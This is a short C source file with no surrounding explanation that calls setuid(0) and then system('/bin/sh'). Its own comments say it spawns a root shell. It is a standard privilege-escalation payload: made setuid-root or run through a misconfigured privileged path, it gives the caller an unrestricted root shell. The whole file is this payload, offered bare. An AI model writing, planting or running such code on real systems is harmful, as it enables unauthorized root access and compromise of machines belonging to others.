#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);              // Set effective UID to root
    system("/bin/sh");  // Spawn a root shell
    return 0;
}
